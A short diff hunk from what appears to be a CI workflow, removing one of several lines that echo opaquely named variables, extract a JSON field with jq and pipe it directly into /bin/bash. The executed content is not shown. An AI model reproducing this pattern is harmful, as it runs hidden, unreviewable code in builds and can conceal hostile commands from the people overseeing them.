@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$tsios0106" | jq -r .x77 | /bin/bash
           echo $l2807 | jq -r .h070 | /bin/bash
           echo $n2524 | jq -r .ala323 | /bin/bash
-          echo $aiubf615 | jq -r .afm9 | /bin/bash
 
       - name: Archive output
         if: always()
